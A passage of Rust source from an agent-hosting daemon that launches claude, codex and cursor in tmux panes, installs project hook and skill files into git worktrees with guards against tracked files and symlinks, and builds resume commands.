        return Err(DomainError::InvalidArgument { what: "prompt contains a NUL byte" });
    }
    Ok(())
}

/// The whole first-launch command for a terminal: `preset_command_with_hooks`
/// with `prompt` inline, or through a file when inline would be too long for
/// tmux (`MAX_INLINE_LAUNCH_BYTES`).
///
/// Measured on the finished command, pane actor and all, because that is the
/// string tmux is sent. The file is `prompt-<terminal id>` in the runtime
/// directory, created 0600 — a prompt is somebody's words, and the runtime
/// directory is shared by nothing but this user's own daemon. A file that
/// cannot be written costs the prompt, not the pane: the agent opens with an
/// empty composer, which is what happened to every prompt before this existed.
fn launch_command_with_prompt(
    runtime_dir: &Path,
    terminal: Uuid,
    preset: &str,
    session_id: Option<&str>,
    mut extras: LaunchExtras,
    prompt: Option<&str>,
    task_key: Option<&str>,
) -> String {
    let build = |extras: &LaunchExtras| {
        with_pane_env(terminal, preset, task_key, preset_command_with_hooks(preset, session_id, extras))
    };
    // Trimmed first, the way the Mac trims its draft, and only THEN guarded:
    // "update" and nine kilobytes of newlines has whitespace in it, so
    // `guarded` would leave it alone — and the file form's `"$(cat …)"`
    // strips trailing newlines, which would hand the agent a bare `update`.
    // Trimming here covers every client, not only the one that trims.
    let prompt = prompt.map(str::trim).filter(|p| !p.is_empty());
    extras.prompt = prompt.map(|p| LaunchPrompt::Inline(p.to_string()));
    let command = build(&extras);
    let Some(text) = prompt else { return command };
    if command.len() <= MAX_INLINE_LAUNCH_BYTES {
        return command;
    }
    let path = prompt_file(runtime_dir, terminal);
    extras.prompt = match write_private_file(&path, &guarded(text)) {
        Ok(()) => Some(LaunchPrompt::File(path)),
        Err(e) => {
            tracing::warn!(error = %e, "could not write a long prompt to a file; the agent starts without it");
            None
        }
    };
    build(&extras)
}

/// Where a terminal's long prompt waits for its launch to read it.
fn prompt_file(runtime_dir: &Path, terminal: Uuid) -> PathBuf {
    runtime_dir.join(format!("prompt-{terminal}"))
}

/// Remove a prompt file nothing will read: its window was never made. A
/// prompt is somebody's words and should not outlive its one use.
fn remove_prompt_file(runtime_dir: &Path, terminal: Uuid) {
    let _ = std::fs::remove_file(prompt_file(runtime_dir, terminal));
}

/// Write `text` to `path`, readable by this user only.
fn write_private_file(path: &Path, text: &str) -> std::io::Result<()> {
    use std::io::Write;
    let mut options = std::fs::OpenOptions::new();
    options.write(true).create(true).truncate(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        options.mode(0o600);
    }
    options.open(path)?.write_all(text.as_bytes())
}

/// Whether a preset's program takes `--plugin-dir`: claude and cursor, both
/// measured. Gated like the flag itself in `preset_command_with_hooks`.
fn takes_plugin_dir(preset: &str) -> bool {
    preset.starts_with("claude") || preset.split_once(':').map_or(preset, |(agent, _)| agent) == "cursor"
}

/// Write one agent's copy of the manager skill into a worktree, under the
/// rules the hooks files follow and more.
///
/// - `skill_install::install_file` writes a missing file and replaces only an
///   unedited copy of ours. An edited copy, or a file we never wrote, is left
///   alone, and is found out before git is asked anything.
/// - **A file git tracks is never written.** A committed copy is somebody's
///   decision, and changing it would put a change in their diff they never
///   made.
/// - **Nothing is written through a symbolic link** (`crosses_a_symlink`): a
///   `.agents` that links to a shared skills directory is outside the worktree.
/// - **Git is told to ignore it first** (`exclude_locally`), in the
///   repository's own `info/exclude`, which is local and never committed. The
///   copy is untracked, and without that line any agent's `git add -A` in this
///   worktree would commit a document naming this runner's CLI path. When the
///   line can't be written, neither is the skill: a codex with no manager skill
///   is better than a commit nobody meant to make.
///
/// The ordinary launch, where the file already says this, spawns nothing.
///
/// Never fails, like `install_project_hooks`: a worktree we can't write
/// costs this agent the skill and nothing else.
async fn install_project_skill(worktree: &Path, harness: crate::skill_install::Harness) {
    use crate::skill_install::{Holds, Installed, crosses_a_symlink, holds, install_file, render};
    let cli = shell_quote(&shim_binary(std::env::current_exe().ok().as_deref()));
    for file in render(harness, &cli) {
        let path = worktree.join(file.relative);
        if crosses_a_symlink(worktree, file.relative) {
            tracing::info!(
                path = %path.display(),
                "a symbolic link is on the way to this file; leaving the manager skill out of it"
            );
            continue;
        }
        if std::fs::read(&path).is_ok_and(|now| now == file.contents.as_bytes()) {
            continue;
        }
        if holds(&path) == Holds::Somebodys {
            tracing::info!(path = %path.display(), "leaving somebody's skill file alone");
            continue;
        }
        if git_tracks_without_blocking(worktree, file.relative).await {
            tracing::info!(
                path = %path.display(),
                "the repository tracks this file; leaving the manager skill out of it"
            );
            continue;
        }
        if !exclude_locally(worktree, file.relative).await {
            tracing::warn!(
                path = %path.display(),
                "could not tell git to ignore the manager skill; not writing it"
            );
            continue;
        }
        if let Installed::LeftAlone(why) = install_file(&path, &file.contents) {
            tracing::info!(path = %path.display(), why, "leaving somebody's skill file alone");
        }
    }
}

/// Whether git tracks `relative` in `worktree`, for the launch paths: through
/// `git::git_bytes`, so it holds no runtime thread while git runs, and a git
/// that hangs (a slow filesystem, an fsmonitor hook) is killed at
/// `git::GIT_TIMEOUT` instead of pinning a worker.
async fn git_tracks_without_blocking(worktree: &Path, relative: &str) -> bool {
    tracked_by(git::git_bytes(worktree, &["ls-files", "--", relative]).await)
}

/// What `git ls-files -- <path>` says about tracking. A path in the index is
/// tracked, and anything but a clean "not in the index" (git missing, a
/// directory that isn't a repository or that `safe.directory` refuses, a
/// corrupt index, a timeout) counts as tracked: when we can't tell, we don't
/// write.
fn tracked_by(answer: Result<git::GitBytes>) -> bool {
    match answer {
        Ok(out) if out.ok => !out.stdout.trim_ascii().is_empty(),
        _ => true,
    }
}

/// Add `/relative` to the repository's `info/exclude`, unless a line already
/// says exactly that, and say whether the line is there now.
///
/// `info/exclude` rather than `.gitignore`: it lives in the repository's own
/// directory, is never committed, and is shared by every worktree of it,
/// which is why the directory comes from `--git-common-dir` and not from the
/// worktree's `.git`, a file in a linked worktree. The leading `/` anchors the
/// pattern at a worktree's root, and the whole path names our file and nothing
/// beside it, so a file of the owner's own in the same directory is still
/// reported. An exclude line hides nothing git already tracks.
async fn exclude_locally(worktree: &Path, relative: &str) -> bool {
    let Ok(out) = git::git_bytes(worktree, &["rev-parse", "--git-common-dir"]).await else {
        return false;
    };
    if !out.ok {
        return false;
    }
    // Bytes, not text: a path that isn't UTF-8 must name the directory git
    // reads, not a lossy copy of it.
    use std::os::unix::ffi::OsStrExt;
    let common = std::ffi::OsStr::from_bytes(out.stdout.strip_suffix(b"\n").unwrap_or(&out.stdout));
    // Relative to the directory git ran in when it's relative at all.
    let exclude = worktree.join(common).join("info").join("exclude");
    let line = format!("/{relative}");
    let existing = match std::fs::read_to_string(&exclude) {
        Ok(text) => text,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => String::new(),
        Err(_) => return false,
    };
    if existing.lines().any(|l| l.trim_end() == line) {
        return true;
    }
    let separator = if existing.is_empty() || existing.ends_with('\n') { "" } else { "\n" };
    // One comment says whose these lines are, however many follow it.
    const WHOSE: &str = "# Far Cooler's manager skill for codex";
    let said = existing.lines().any(|l| l.trim_end() == WHOSE);
    let comment = if said { String::new() } else { format!("{WHOSE}\n") };
    let append = || -> std::io::Result<()> {
        use std::io::Write;
        if let Some(info) = exclude.parent() {
            std::fs::create_dir_all(info)?;
        }
        let mut file = std::fs::OpenOptions::new().create(true).append(true).open(&exclude)?;
        file.write_all(format!("{separator}{comment}{line}\n").as_bytes())
    };
    append().is_ok()
}

/// Whether a worktree holds a manager-skill file that removing it would lose
/// and that `git::is_dirty` can't see: one at our path that isn't an unedited
/// copy of ours, and that git doesn't track.
///
/// `exclude_locally` tells git to ignore our paths in every worktree of the
/// repository, so an owner who edited our copy, or who put a file of their own
/// at that path, has work git reports nowhere. A tracked file needs none of
/// this: `is_dirty` reports its changes like any other file's, and its
/// committed bytes survive in the branch. A git we can't ask means we ask the
/// owner instead.
async fn holds_an_unseen_skill_file(worktree: &Path) -> bool {
    use crate::skill_install::{Holds, PROJECT_SKILL_FILES, crosses_a_symlink, holds};
    for relative in PROJECT_SKILL_FILES {
        // Through a link, the file lives somewhere removal doesn't reach.
        if crosses_a_symlink(worktree, relative) || holds(&worktree.join(relative)) != Holds::Somebodys {
            continue;
        }
        let tracked = git::git(worktree, &["ls-files", "--", relative]).await;
        match tracked {
            Ok(out) if out.ok && !out.stdout.trim().is_empty() => continue,
            _ => return true,
        }
    }
    false
}

/// Whether a worktree holds an untracked hooks file that removing it would
/// lose and that `git::is_dirty` can't see: one holding anything besides our
/// registrations (`hook_install::holds_only_ours`).
///
/// `is_dirty` subtracts every untracked `.codex/hooks.json` and
/// `.cursor/hooks.json` so our own writes aren't reported as the user's work.
/// But an untracked hooks file can be the owner's: their own file in a
/// worktree the reconciler adopted, with our entries merged in when they
/// opened codex there, or entries they added to ours. `git worktree remove
/// --force` deletes it either way, so removal asks. A tracked copy needs none
/// of this: `is_dirty` reports its changes, and its committed bytes survive in
/// the branch.
///
/// Read off `status`, `git status` as git reports it
/// (`change_set::working_tree_as_git_reports_it`), the same answer
/// `removal_needs_confirmation` derives dirtiness from: one git process and
/// one snapshot for both. `socket` is this runner's hook socket, which is how
/// an entry of ours under an older CLI path is still known for ours.
fn holds_an_unseen_hook_file(worktree: &Path, status: &crate::change_set::WorkingTree, socket: &Path) -> bool {
    use crate::hook_install::{PROJECT_HOOK_FILES, holds_only_ours};
    for file in &status.untracked {
        let relative = file.path.as_str();
        // Through a link, the file lives somewhere removal doesn't reach.
        if !PROJECT_HOOK_FILES.contains(&relative) || crate::skill_install::crosses_a_symlink(worktree, relative) {
            continue;
        }
        match std::fs::read(worktree.join(relative)) {
            Ok(bytes) if holds_only_ours(&String::from_utf8_lossy(&bytes), socket) => {}
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
            _ => return true,
        }
    }
    false
}

/// The one project-local hooks file this preset's agent reads, or `None` for
/// an agent that reads none.
///
/// codex and cursor each have a file of their own, in their own vocabulary.
/// claude has neither, because it is handed `--settings` instead; `shell`,
/// `changes` and every agent with no hook support have nothing to write, and
/// writing something anyway would leave a registration on disk for a program
/// that will never read it.
///
/// One file, not both, deliberately — and this is the difference between this
/// and `install_project_hooks` above. Making a worktree is "get this directory
/// ready for whatever runs in it"; launching a pane is one person opening one
/// agent, and dropping a `.cursor/` into somebody's checkout because they
/// opened codex is a write nothing they did asked for.
///
/// The AGENT, not the whole preset: `codex:gpt-5.6-sol` names codex, and a
/// match on the whole string would miss every pane launched with a model on
/// it. Compared exactly rather than by prefix, so that a later `codex-review`
/// preset arrives here as a miss somebody has to decide about rather than as a
/// file quietly written for it.
fn project_hook_file_for(preset: &str) -> Option<(&'static str, MergeHooks)> {
    use crate::hook_install::{CODEX_HOOKS, CURSOR_HOOKS, merge_codex, merge_cursor};
    match preset.split_once(':').map_or(preset, |(agent, _)| agent) {
        "codex" => Some((CODEX_HOOKS, merge_codex)),
        "cursor" => Some((CURSOR_HOOKS, merge_cursor)),
        _ => None,
    }
}

/// Merge our registrations into one such file.
///
/// The guard worth naming is the parse. `merge_codex`/`merge_cursor` treat
/// text they cannot read as a file with nothing in it yet — the right answer
/// for a missing or empty file, and the wrong one for a file somebody is
/// midway through editing, because the merge would then hand back a document
/// holding our three hooks and nothing else and we would write it over theirs.
/// So a file that is present and is not a JSON object is left exactly as it
/// is. Losing the live view is recoverable; replacing a file we do not own is
/// a support incident somebody finds out about days later.
///
/// The other guard is git. A hooks file the repository tracks is the team's,
/// and our registrations name this runner's CLI path: written into a tracked
/// file they become a change in `git status`, and the next `git commit -a`
/// commits them. So a tracked file is never written, and that agent reports
/// nothing in that repository. `git_tracks_without_blocking` counts "can't
/// tell" as tracked. It runs only when there is something to write, so the
/// ordinary launch, where the file already says this, spawns nothing.
///
/// And a symbolic link on the way to the file is somebody's arrangement: a
/// `.codex` linked to `~/.codex` would have our entries merged into the
/// user's global hooks, outside anything Far Cooler was asked to touch. The
/// skill installer refuses the same way (`skill_install::crosses_a_symlink`).
async fn install_project_hook_file(worktree: &Path, relative: &str, socket: &Path, merge: MergeHooks) {
    let path = &worktree.join(relative);
    if crate::skill_install::crosses_a_symlink(worktree, relative) {
        tracing::info!(
            path = %path.display(),
            "a symbolic link is on the way to this hooks file; leaving it alone, so this agent reports nothing here"
        );
        return;
    }
    let existing = match std::fs::read_to_string(path) {
        Ok(text) => text,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => String::new(),
        Err(e) => {
            tracing::warn!(
                error = %e,
                path = %path.display(),
                "could not read an existing hooks file; leaving it alone"
            );
            return;
        }
    };

    let starting = if existing.trim().is_empty() {
        // A file with nothing in it says nothing to preserve. This is also the
        // state a missing file arrives here as.
        "{}".to_string()
    } else if serde_json::from_str::<serde_json::Value>(&existing).is_ok_and(|v| v.is_object()) {
        existing
    } else {
        tracing::warn!(
            path = %path.display(),
            "an existing hooks file is not a JSON object; leaving it alone rather than replacing it"
        );
        return;
    };

    let merged = merge(&starting, socket);

    // The file already says this, so leave it alone entirely.
    //
    // Every launch of a codex or cursor pane comes through here now, and the
    // second launch in a worktree must cost nothing: an identical rewrite
    // still changes the mtime, which wakes every file watcher on the runner
    // and drops the file out of git's stat cache so the next `git status`
    // re-hashes it — all for a byte-for-byte identical document. The merge is
    // a pure function of the socket path and the socket is `<root>/h.sock` for
    // the life of the daemon, so "no change" is the ordinary answer here
    // rather than a rare one, which is why installing on every launch needs no
    // record of which worktrees have already been done.
    //
    // `starting`, not `existing`: the two are the same string for every file
    // that is present and is an object, which is every file this can reach
    // here with one. A missing or empty file arrives as `{}`, which no merge
    // ever produces, so the first install always writes.
    if merged == starting {
        return;
    }

    if git_tracks_without_blocking(worktree, relative).await {
        tracing::info!(
            path = %path.display(),
            "the repository tracks this hooks file; leaving it alone, so this agent reports nothing here"
        );
        return;
    }

    if let Some(dir) = path.parent()
        && let Err(e) = std::fs::create_dir_all(dir)
    {
        tracing::warn!(
            error = %e,
            path = %dir.display(),
            "could not make room for a hooks file; this worktree reports nothing for this agent"
        );
        return;
    }

    if let Err(e) = std::fs::write(path, merged) {
        tracing::warn!(
            error = %e,
            path = %path.display(),
            "could not write a hooks file; this worktree reports nothing for this agent"
        );
    }
}

/// The command to respawn a pane that just switched back to `Terminal` mode.
///
/// `preset` is `command_preset` off the terminal record — this function's
/// only job is to read it honestly instead of assuming claude. That
/// assumption was correct back when claude was the only hostable agent; once
/// codex, opencode and cursor joined it, a pane switched to chat and back
/// came back running claude regardless of what it actually hosted — the same
/// "handed a different agent wearing the same pane" failure the `Agent` arm
/// of `set_pane_mode` refuses to cause, happening in the opposite direction.
/// `command_preset` is written every time a pane switches INTO agent mode
/// (see the bottom of `set_pane_mode`), so it is the daemon's own record of
/// what was on screen a moment ago, not a guess.
///
/// An empty preset does not mean claude either: `create_terminal` always
/// writes one, so empty means this terminal has never been through agent
/// mode (or predates this column) — not that it forgot a claude session. The
/// honest fallback is the same clean shell a brand new terminal gets.
///
/// `resumable` is computed by the caller, which has filesystem access this
/// pure function deliberately does not: whether `session_id` names a
/// transcript (claude) or a rollout (codex) that actually exists on disk —
/// see `session_discovery::transcript_exists` and `::codex_rollout_exists`.
///
/// Only claude and codex get a resume flag here. Both have been verified end
/// to end on this machine: `claude --resume` and `codex resume` each restore
/// a real conversation given a session id with a transcript/rollout behind
/// it. opencode and cursor have not — inventing a flag for an unverified CLI
/// would trade a silent agent-swap for a silent wrong-flag failure, no better
/// for the user, so they keep starting clean. That is a statement about what
/// has been checked, not about what those CLIs can do; either may well
/// support resuming, unverified rather than unsupported.
fn terminal_mode_command(
    preset: &str,
    session_id: &str,
    resumable: bool,
    extras: &LaunchExtras,
) -> String {
    let preset = if preset.is_empty() { "shell" } else { preset };
    let shell = farcooler_core::shell::login_shell;
    if preset.starts_with("claude") {
        if resumable {
            // A RESUMED claude pane needs the settings file exactly as much as
            // a fresh one: this is the path a pane takes coming back from a
            // chat, or being restarted after its process died, and it is how
            // most claude panes on a long-lived runner are running by the end
            // of a day. Without it the live view worked once, at launch, and
            // went silent the first time anything respawned the pane.
            //
            // `shell_quote` around the whole payload for `preset_command`'s
            // reason, and byte-identical to the bare `'…'` this branch used to
            // write when there is no settings file: the session id is parsed
            // as a uuid before this branch is chosen, so the payload carries
            // no quote of its own.
            let settings = claude_extra_flags(extras);
            format!(
                "{} -ilc {}",
                shell(),
                shell_quote(&format!("{} --resume {session_id}{settings}", agent_program("claude")))
            )
        } else {
            // Nothing to continue: start claude clean rather than fail into
            // an error message the user cannot act on.
            //
            // `preset`, not the bare agent name: a `claude:opus` pane that
            // starts clean must still start on opus. The resume branch above
            // cannot say the same — `--model` alongside `--resume` has not
            // been checked end to end here, and this file does not invent
            // flags it has not seen work.
            preset_command_with_hooks(preset, None, extras)
        }
    } else if preset.starts_with("codex") {
        if resumable {
            format!("{} -ilc '{} resume {session_id} {CODEX_NO_UPDATE_CHECK}'", shell(), agent_program("codex"))
        } else {
            // Same reasoning as claude's clean-start branch above: a codex
            // session with no completed turn wrote no rollout, and `codex
            // resume` on an id with nothing behind it fails with an error the
            // user cannot act on.
            //
            // `preset` rather than the bare name, for the same reason as
            // claude's branch above: the model a pane was launched with
            // survives a clean start.
            //
            // Handed the settings path like every other branch, and it reaches
            // nothing: `preset_command_with_hooks` writes `--settings` in its
            // claude arm alone, which a codex preset never enters. Passing it
            // uniformly keeps that rule in ONE place rather than restating it
            // as a condition at each call site, where the two spellings could
            // disagree — `no_other_agent_is_handed_claudes_settings_flag` is
            // what pins it.
            preset_command_with_hooks(preset, None, extras)
        }
    } else {
        preset_command_with_hooks(preset, None, extras)
    }
}

/// The command that puts a TUI back in a pane — for BOTH ways a pane gets one.
///
/// Two callers, and until now only one of them was right. `set_pane_mode`
/// switching a chat back to a terminal went through `terminal_mode_command`
/// and resumed the conversation; `restart_terminal` went through
/// `preset_command` and did not. `preset_command` is the LAUNCH builder — its
/// claude arm declares `--session-id`, which NAMES A NEW conversation rather
/// than reopening the old one, its codex arm ignores the session entirely, and
/// its fallback for a preset it does not recognize is a bare login shell. So
/// restarting a lost claude or codex pane handed back an agent with no memory,
/// or no agent at all: "claude/codexes often revert back to just shell", as it
/// was reported.
///
/// Having one function both callers go through is the fix, not a tidy-up. The
/// two paths are the same question — this preset, this session, is there
/// anything on disk to reopen — and while they were two pieces of code only
/// one of them could be, and was, kept correct.
///
/// `home` is threaded in rather than read here so this is testable without a
/// process-global `$HOME`: the resumability check reads real files under
/// `~/.claude/projects` and `~/.codex/sessions`, and a test that had to move
/// the real home directory to see it work would be a test nobody dares run.
/// `None` means the home directory could not be determined at all, which is
/// the same answer as "nothing to resume": start clean.
///
/// A session id that is not a plain uuid is not resumable either. It ends up
/// inside a `-ilc` string, and `terminal_mode_command` interpolates it
/// unquoted — the parse is what makes that safe, so it has to happen before
/// the flag is chosen and not merely alongside it.
fn respawn_command(
    home: Option<&Path>,
    preset: &str,
    worktree: &str,
    session_id: &str,
    extras: &LaunchExtras,
) -> String {
    let resumable = Uuid::parse_str(session_id).is_ok()
        && home.is_some_and(|home| {
            // Claude Code writes a transcript when a turn happens, not when a
            // session is created — so a chat opened and closed without a word
            // has a perfectly real session id and no file. `--resume` answers
            // "No conversation found with session ID" for those, which is what
            // a user got every time they looked at a chat and switched
            // straight back. Codex writes its rollout under the identical
            // rule, verified end to end on this machine, so it gets the same
            // guard rather than a silent conversation loss.
            if preset.starts_with("codex") {
                session_discovery::codex_rollout_exists(home, session_id)
            } else {
                session_discovery::transcript_exists(home, Path::new(worktree), session_id)
            }
        });
    terminal_mode_command(preset, session_id, resumable, extras)
}

/// This user's home directory, or `None` when there is no answer.
///
/// A named function rather than `directories::UserDirs::new()` spelled out at
/// each call site, so that both respawn paths ask the same question of the
/// same source — the shape the bug above came from was two call sites that
/// had drifted apart.
fn user_home() -> Option<PathBuf> {
    directories::UserDirs::new().map(|d| d.home_dir().to_path_buf())
}

/// A plain identifier: letters, digits, dot, dash, underscore.
///
/// Deliberately narrower than what a shell would accept. Every real model name
/// fits, and nothing that fits can end a quoted string.
fn is_safe_model(text: &str) -> bool {
    !text.is_empty()
        && text.len() <= 64
        && text
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_' || c == '.')
}

/// Whether `command`/`screen` identify Claude Code specifically — not merely
/// an agent Far Cooler can host as a chat.
///
/// Pulled out of `Service::pane_can_adopt_a_claude_session` so the one
/// decision that actually matters — `claude`, not `chat_capable` — is
/// reachable by a test with no live tmux pane or screen capture behind it.
/// `is_some_and(|rules| rules.preset == "claude")` looks trivial in isolation;
/// it is exactly the line that regressed to `chat_capable` once codex and
/// cursor got adapters, so it is worth pinning on its own.
fn identifies_claude(
    registry: &farcooler_core::activity::Registry,
    command: &str,
    screen: &str,
) -> bool {
    registry
        .identify(command, screen)
        .is_some_and(|rules| rules.preset == "claude")
}

/// The conversation a pane switching into agent mode may adopt, if any.
///
/// Pulled out of `Service::set_pane_mode` for one reason: the argument this
/// hands `discover_claude_session` for `started_after` is the thing that was
/// wrong, and until it lived in a function a test could call, no test could
/// see it. `session_discovery`'s own
/// `a_session_older_than_the_pane_is_not_a_candidate` passes and always has —
/// it calls discovery directly with a floor of its own choosing, so it pins
/// what the parameter DOES and is blind to production having disabled it.
/// A test of adoption has to be a test of the caller.
///
/// `pid` is the process the pane is showing, and `None` means the `ps` walk
/// could not name one. Both that and an unreadable start time refuse: there is
/// no safe default floor. A floor old enough to never wrongly exclude is the
/// epoch, which is the bug; a floor recent enough to be safe is a guess about
/// a process nobody could see. Starting a fresh conversation is the answer
/// that cannot attach a person to somebody else's thread.
async fn session_to_adopt(
    terminal: Uuid,
    home: &Path,
    worktree: &Path,
    pid: Option<i32>,
    claimed: &[String],
) -> Option<String> {
    let Some(pid) = pid else {
        tracing::info!(
            terminal = %terminal,
            "nothing is running in this pane to date a conversation against; starting a new one"
        );
        return None;
    };
    let Some(started_after) = foreground::started_at(pid).await else {
        tracing::info!(
            terminal = %terminal,
            pid,
            "this pane's process has no readable start time; starting a new one"
        );
        return None;
    };
    match session_discovery::discover_claude_session(home, worktree, started_after) {
        Ok(found) if !claimed.contains(&found) => {
            // The success path was the silent one. A refusal said so; an
            // ADOPTION -- the case where this pane is about to render
            // somebody's conversation -- recorded nothing at all, so "which
            // session did it pick, and what else was on the table" had no
            // answer after the fact.
            tracing::info!(
                terminal = %terminal,
                worktree = %worktree.display(),
                session = %found,
                claimed = ?claimed,
                started_after = ?started_after,
                "adopting the conversation found in this pane"
            );
            Some(found)
        }
        Ok(found) => {
            tracing::info!(
                session = %found,
                "the only session here belongs to another terminal; starting a new one"
            );
            None
        }
        // Ambiguous, absent, or older than the process in the pane: start
        // fresh rather than guess which of several conversations this pane
        // meant.
        Err(e) => {
            tracing::info!(error = %e, "no session to adopt; starting a new one");
            None
        }
    }
}

/// The `command_preset` to store once a pane is known to be hosting `harness`,
/// or `None` when the record already says so.
///
/// `set_pane_mode` records what a pane turned out to be running, so that
/// leaving agent mode respawns THAT agent rather than a guess. What it has to
/// write with is `Registry::identify`, and identify answers with an agent's
/// NAME — `claude`, never `claude:opus`. A preset may carry a model after a
/// colon, so writing identify's answer over the record unconditionally cost a
/// `claude:opus` pane its model the first time it was ever opened as a chat,
/// permanently: the column is the only record of it, and every later clean
/// start reads the column.
///
/// That was invisible because the model is preserved one layer DOWN, in
/// `terminal_mode_command`'s clean-start branches and in `preset_command`,
/// each of which goes to the trouble of passing the whole preset rather than
/// the bare agent name — and `respawn_tests` pins exactly that. Those tests
/// call the builder directly, so they kept passing while the value reaching
/// the builder had already been flattened here, one function upstream of
/// everything they cover.
///
/// So: compare on the agent alone, and keep the record when it already names
/// that agent. A pane that genuinely turns out to host a DIFFERENT agent than
/// the record claims is still rewritten — there is no model to preserve for an
/// agent nobody recorded, and naming the wrong agent is the failure this write
/// exists to prevent.
fn preset_after_adopting(recorded: &str, harness: &str) -> Option<String> {
    let agent = recorded.split_once(':').map(|(a, _)| a).unwrap_or(recorded);
    (agent != harness).then(|| harness.to_string())
}

/// Directories the `@`-mention picker never walks.
///
/// Build output and caches, which nobody mentions and which dwarf the tree they
/// sit in — a Swift package's `.build` alone contributed hundreds of
/// `index/store/v5/units/…` entries, so an unfiltered `@` filled its list with
/// object files before reaching a single source file.
///
/// A denylist rather than reading `.gitignore`, deliberately: an untracked file
/// the agent just created is exactly the one a user wants to mention next, so
/// honouring ignore rules would hide the best answers.
const SKIP_DIRS: &[&str] = &[
    ".git",
    ".build",
    ".next",
    ".venv",
    "__pycache__",
    "build",
    "dist",
    "node_modules",
    "target",
    "vendor",
    "venv",
];

pub struct Service {
    /// Behind an `Arc` so `hooks` can read the same database through the same
    /// connection. `Store` is not `Clone` — it owns a `Connection` behind a
    /// mutex — so the alternative is a second connection to the same file:
    /// another handle to open, migrate and keep in step, for no gain.
    pub store: Arc<Store>,
    pub tmux: TmuxServer,
    pub inventory: LiveInventory,
    pub host_id: Uuid,
    /// This install's id — the same string the tmux server is named after.
    ///
    /// Held rather than re-read, for the reason `root` is: the file it comes
    /// from sits under a directory the environment can move. It is also what
    /// marks a worktree as belonging to this install rather than to another
    /// one sharing the host.
    install_id: String,
    /// Where this service's runtime data lives.
    ///
    /// Held rather than re-derived from `FARCOOLER_HOME` at each use. The
    /// environment is process-global, so a service that consulted it on every
    /// call could be moved out from under itself — which is exactly what
    /// happens when two tests run in parallel, and would happen in production
    /// the first time anything set the variable after startup.
    root: PathBuf,
    /// The `authorized_keys` this runner enrolls devices into.
    ///
    /// A field rather than a home directory looked up at each use, for the
    /// reason `root` is one and then some: the file decides who may log in
    /// here, and a test that reached the real one could take away the SSH
    /// access of whoever ran the suite. Holding it means a test points ONE
    /// service at a scratch file; an environment variable would be
    /// process-global and would move every other test's target with it.
    authorized_keys: PathBuf,
    /// Every connection this daemon is serving, so a revocation can end the
    /// ones belonging to the device it revoked.
    ///
    /// Here rather than beside the listener because `enrollment::revoke` is
    /// where the decision is made and a `Service` is what it is handed. It is
    /// runtime truth, never stored: a session is a live connection and a
    /// restarted daemon has none.
    sessions: Arc<crate::sessions::Sessions>,
    /// Which agents are recognized, and which can be hosted as a chat.
    ///
    /// Held rather than re-read per call, for the same reason `root` is: the
    /// config file and the environment that locates it are process-global, and
    /// a service that consulted them on every call could be moved out from
    /// under itself — which is what happens when two tests run in parallel.
    ///
    /// Swappable, but still not per-call. `adapter.upsert` and `adapter.delete`
    /// call `reload_registry` so an edit made from a settings screen takes
    /// effect without `daemon ensure`; everything else reads a snapshot. The
    /// `Arc` is what preserves the property the paragraph above is about: a
    /// caller holds one consistent registry for the whole of its operation, so
    /// a concurrent reload cannot change the rules underneath it halfway
    /// through. Editing the file BY HAND still needs a restart, unchanged.
    registry: std::sync::RwLock<Arc<farcooler_core::activity::Registry>>,
    /// Every terminal's agent session: activity, cursor, and the fast-attach
    /// event window. See `agent_supervisor` for why the transcript itself is
    /// not here.
    agents: agent_supervisor::AgentSupervisor,
    /// The hook path's per-terminal assembly state.
    ///
    /// Held here rather than made where the listener is spawned, because the
    /// state has to outlive any one listener and because deleting a terminal
    /// has to be able to drop it. A `HookIngress` nobody holds is one nothing
    /// can ever tell that a terminal went away.
    hooks: hook_ingress::HookIngress,
    /// Change sets, cached behind a two-syscall gate.
    ///
    /// Not in the store: nothing here is durable. It is a derivation of git, and
    /// the only reason it is held at all is that recomputing it per keystroke of
    /// scrolling would put a `git status` on the critical path of a phone.
    pub review_cache: crate::review::ReviewCache,
    /// PR state, in memory and nowhere else.
    ///
    /// Deliberately not durable. Writing it would mean a restarted daemon
    /// confidently showing yesterday's "merged" for a PR that was reopened, and
    /// "runtime state is derived, never stored" applies to a third party's
    /// lifecycle at least as strongly as to our own. After a restart every PR
    /// reads Unknown until a refresh succeeds.
    pr_cache: std::sync::Mutex<std::collections::HashMap<Uuid, Option<Vec<crate::stack::PrInfo>>>>,
    /// When a background PR fill was last STARTED for a repository.
    ///
    /// Started, not finished, and that is the point: it is written before the
    /// subprocess is spawned, so five clients opening the same repository in the
    /// same second fork one `gh` between them rather than five. See
    /// `claim_pr_fill`.
    pr_fills: std::sync::Mutex<std::collections::HashMap<Uuid, std::time::Instant>>,
    /// How many `gh` processes may run at once, across every repository.
    gh_limit: Arc<tokio::sync::Semaphore>,
    /// Each repository's default branch, once discovered.
    ///
    /// In memory like PR state, and for a weaker version of the same reason: it
    /// changes about once in a repository's life, but writing it would mean a
    /// restarted daemon confidently diffing against a default that has since
    /// been renamed. Cheap to rediscover, so it is.
    default_branches: std::sync::Mutex<std::collections::HashMap<Uuid, Option<String>>>,
    /// Each repository's page on GitHub, from the same `gh repo view` the line
    /// above is filled by and written in the same pass.
    ///
    /// A separate map rather than a wider value on `default_branches`, because
    /// the two answers are not interchangeable: the branch has a local fallback
    /// (`origin/HEAD`) and is remote-qualified afterwards, and the URL has
    /// neither. Held for the same lifetime and for the same reason.
    repo_urls: std::sync::Mutex<std::collections::HashMap<Uuid, Option<String>>>,
    /// One mutex per repository, created on first use and never removed.
    ///
    /// Held across any sequence that mutates git and then writes a workspace
    /// row. `create_workspace` runs `git worktree add` and then inserts; the
    /// reconciler lists worktrees and then adopts what has no row. Without
    /// this, a reconcile landing between those two halves sees a worktree with
    /// no row, adopts it under the directory name, and the original call then
    /// inserts a second row for the same path.
    ///
    /// `git.rs` has claimed since it was written that creation "is serialized
    /// per repository". It was not; nothing depended on it until the reconciler
    /// existed.
    ///
    /// Never pruned. A `Mutex<()>` is two words, repositories are counted in
    /// tens, and a registry that removes entries has to prove nobody is waiting
    /// on the one it is removing.
    repo_locks: std::sync::Mutex<std::collections::HashMap<Uuid, Arc<tokio::sync::Mutex<()>>>>,
}

/// A workspace plus its derived state and terminals.
#[derive(Debug)]
pub struct WorkspaceView {
    pub workspace: models::Workspace,
    pub state: WorkspaceState,
    pub terminals: Vec<TerminalView>,
